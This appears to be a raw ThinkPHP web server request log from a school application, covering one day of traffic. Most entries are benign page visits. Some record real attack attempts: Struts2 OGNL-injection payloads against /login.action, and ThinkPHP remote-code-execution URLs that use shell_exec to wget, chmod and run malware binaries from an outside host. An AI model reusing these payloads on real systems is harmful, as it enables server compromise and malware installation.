---------------------------------------------------------------
[ 2019-02-10T00:19:34+08:00 ] 14.17.3.65 GET 148.70.73.177/
[运行时间：0.015845s] [吞吐率：63.11req/s] [内存消耗：1,245.48kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '148.70.73.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T01:46:40+08:00 ] 45.167.44.252 GET 148.70.73.177:80/
[运行时间：0.017010s] [吞吐率：58.79req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T01:49:34+08:00 ] 222.187.86.141 POST 148.70.73.177:80/login.action
[运行时间：0.023315s] [吞吐率：42.89req/s] [内存消耗：1,371.37kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '989',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Auto Spider 1.0',
  'accept-language' => 'zh_CN',
  'host' => '148.70.73.177:80',
)
[ info ] [ PARAM ] array (
  'name' => '%{(#test=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(\'text/html;charset=UTF-8\')).(#res.getWriter().print(\'start:security_\')).(#res.getWriter().print(\'check:end\')).(#res.getWriter().flush()).(#res.getWriter().close())}',
  'age' => 'a',
  '__checkbox_bustedBefore' => 'true',
  'description' => 's',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T01:49:34+08:00 ] 222.187.86.141 POST 148.70.73.177:80/login.action
[运行时间：0.012610s] [吞吐率：79.30req/s] [内存消耗：1,368.35kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'multipart/form-data; boundary=---------------------------7e116d19044c',
  'content-length' => '866',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Auto Spider 1.0',
  'accept-language' => 'zh_CN',
  'host' => '148.70.73.177:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T01:49:35+08:00 ] 222.187.86.141 POST 148.70.73.177:80/login.action
[运行时间：0.013620s] [吞吐率：73.42req/s] [内存消耗：1,372.28kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => '%{(#test=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(\'text/html;charset=UTF-8\')).(#res.getWriter().print(\'security_\')).(#res.getWriter().print(\'check\')).(#res.getWriter().flush()).(#res.getWriter().close())}',
  'content-length' => '0',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Auto Spider 1.0',
  'accept-language' => 'zh_CN',
  'host' => '148.70.73.177:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T01:49:35+08:00 ] 222.187.86.141 POST 148.70.73.177:80/login.action
[运行时间：0.013072s] [吞吐率：76.50req/s] [内存消耗：1,369.55kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '471',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Auto Spider 1.0',
  'accept-language' => 'zh_CN',
  'host' => '148.70.73.177:80',
)
[ info ] [ PARAM ] array (
  'redirect:${#req=#context_get(\'co\'+\'m_open\'+\'symphony_xwo\'+\'rk2_disp\'+\'atcher_HttpSer\'+\'vletReq\'+\'uest\'),#resp=#context_get(\'co\'+\'m_open\'+\'symphony_xwo\'+\'rk2_disp\'+\'atcher_HttpSer\'+\'vletRes\'+\'ponse\'),#resp_setCharacterEncoding(\'UTF-8\'),#resp_getWriter()_print("security_"),#resp_getWriter()_print("check"),#resp_getWriter()_flush(),#resp_getWriter()_close()}' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T01:49:35+08:00 ] 222.187.86.141 POST 148.70.73.177:80/login.action
[运行时间：0.013673s] [吞吐率：73.14req/s] [内存消耗：1,369.62kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '484',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Auto Spider 1.0',
  'accept-language' => 'zh_CN',
  'host' => '148.70.73.177:80',
)
[ info ] [ PARAM ] array (
  'debug' => 'command',
  'expression' => '#req=#context.get(\'co\'+\'m.open\'+\'symphony.xwo\'+\'rk2.disp\'+\'atcher.HttpSer\'+\'vletReq\'+\'uest\'),#resp=#context.get(\'co\'+\'m.open\'+\'symphony.xwo\'+\'rk2.disp\'+\'atcher.HttpSer\'+\'vletRes\'+\'ponse\'),#resp.setCharacterEncoding(\'UTF-8\'),#resp.getWriter().print("security_"),#resp.getWriter().print("check"),#resp.getWriter().flush(),#resp.getWriter().close()',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T01:49:35+08:00 ] 222.187.86.141 POST 148.70.73.177:80/login.action
[运行时间：0.011944s] [吞吐率：83.72req/s] [内存消耗：1,369.49kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '425',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Auto Spider 1.0',
  'accept-language' => 'zh_CN',
  'host' => '148.70.73.177:80',
)
[ info ] [ PARAM ] array (
  '(#_memberAccess=@ognl_OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=@org_apache_struts2_ServletActionContext@getRequest(),#res=@org_apache_struts2_ServletActionContext@getResponse(),#res_setCharacterEncoding(#parameters_encoding' => 
  array (
    0 => '',
  ),
  'pp' => '/',
  'encoding' => 'UTF-8',
  'web' => 'security_',
  'path' => 'check',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T01:49:35+08:00 ] 222.187.86.141 POST 148.70.73.177:80/login.action
[运行时间：0.012010s] [吞吐率：83.26req/s] [内存消耗：1,369.49kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login.action',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '436',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Auto Spider 1.0',
  'accept-language' => 'zh_CN',
  'host' => '148.70.73.177:80',
)
[ info ] [ PARAM ] array (
  'method:#_memberAccess=@ognl_OgnlContext@DEFAULT_MEMBER_ACCESS,#req=@org_apache_struts2_ServletActionContext@getRequest(),#res=@org_apache_struts2_ServletActionContext@getResponse(),#res_setCharacterEncoding(#parameters_encoding' => 
  array (
    0 => '',
  ),
  'pp' => '/',
  'encoding' => 'UTF-8',
  'web' => 'security_',
  'path' => 'check',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T03:05:21+08:00 ] 185.172.110.88 GET 148.70.73.177:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.148/miori.x86;%20chmod%20777%20miori.x86;./miori.x86%20thinkphp
[运行时间：0.029219s] [吞吐率：34.22req/s] [内存消耗：1,366.48kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Go-http-client/1.1',
  'host' => '148.70.73.177:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'shell_exec',
    1 => 
    array (
      0 => 'wget http://185.244.25.148/miori.x86; chmod 777 miori.x86;./miori.x86 thinkphp',
    ),
  ),
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T09:01:57+08:00 ] 183.57.54.43 GET /
[运行时间：0.084449s] [吞吐率：11.84req/s] [内存消耗：1,241.55kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T09:18:57+08:00 ] 116.193.173.19 GET 148.70.73.177:80/
[运行时间：0.012768s] [吞吐率：78.32req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T10:12:12+08:00 ] 213.81.178.3 GET 148.70.73.177:80/
[运行时间：0.014379s] [吞吐率：69.55req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T13:54:47+08:00 ] 170.81.28.181 GET 148.70.73.177:80/
[运行时间：0.011498s] [吞吐率：86.97req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T13:58:18+08:00 ] 217.61.105.126 GET 148.70.73.177:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;rm%20-rf%20sh;wget%20http://185.244.25.148/sh;%20chmod%20777%20sh;./sh%20thinkphp
[运行时间：0.024042s] [吞吐率：41.59req/s] [内存消耗：1,366.48kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Go 1.1 package http',
  'host' => '148.70.73.177:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'shell_exec',
    1 => 
    array (
      0 => 'cd /tmp;rm -rf sh;wget http://185.244.25.148/sh; chmod 777 sh;./sh thinkphp',
    ),
  ),
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T14:26:13+08:00 ] 138.97.224.85 GET 148.70.73.177:80/
[运行时间：0.016023s] [吞吐率：62.41req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T14:31:30+08:00 ] 62.175.204.219 GET 148.70.73.177:80/
[运行时间：0.015338s] [吞吐率：65.20req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T14:31:37+08:00 ] 82.129.6.190 GET 148.70.73.177:80/
[运行时间：0.015954s] [吞吐率：62.68req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T17:28:00+08:00 ] 187.102.57.176 GET 148.70.73.177:80/
[运行时间：0.015973s] [吞吐率：62.61req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T18:53:51+08:00 ] 103.79.157.55 GET 148.70.73.177:80/
[运行时间：0.016350s] [吞吐率：61.16req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T22:44:13+08:00 ] 58.251.121.186 GET 148.70.73.177/
[运行时间：0.012554s] [吞吐率：79.66req/s] [内存消耗：1,245.48kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '148.70.73.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-10T23:07:30+08:00 ] 103.199.98.246 GET 148.70.73.177:80/
[运行时间：0.012198s] [吞吐率：81.98req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
